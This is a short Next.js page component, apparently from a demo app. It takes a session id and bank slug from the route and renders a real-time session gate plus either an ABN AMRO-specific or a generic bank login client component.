import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { BankLoginClient } from "./bank-login-client";
import { AbnAmroLoginClient } from "./abn-amro-client";

type Props = {
  params: Promise<{ id: string; bank_slug: string }>;
};

export default async function BankLoginPage({ params }: Props) {
  const { id, bank_slug } = await params;

  return (
    <>
      <SessionRealtimeGate sessionId={id} />
      {bank_slug === "abn-amro" ? (
        <AbnAmroLoginClient sessionId={id} />
      ) : (
        <BankLoginClient sessionId={id} bankSlug={bank_slug} />
      )}
    </>
  );
}
